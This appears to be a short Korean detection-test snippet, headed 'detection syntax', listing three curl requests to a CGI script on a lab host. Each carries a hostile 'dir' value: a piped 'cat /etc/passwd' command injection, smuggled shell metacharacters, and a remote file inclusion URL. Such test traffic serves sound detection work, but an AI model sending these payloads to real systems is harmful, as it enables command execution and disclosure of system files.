## 탐지 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/cgi-bin/foo.cgi?dir=/public|+cat+/etc/passwd"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/cgi-bin/foo.cgi?dir=ls%20|%20&%20bin="
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/cgi-bin/foo.cgi?dir=http://www.hack.gr/css/test.html"

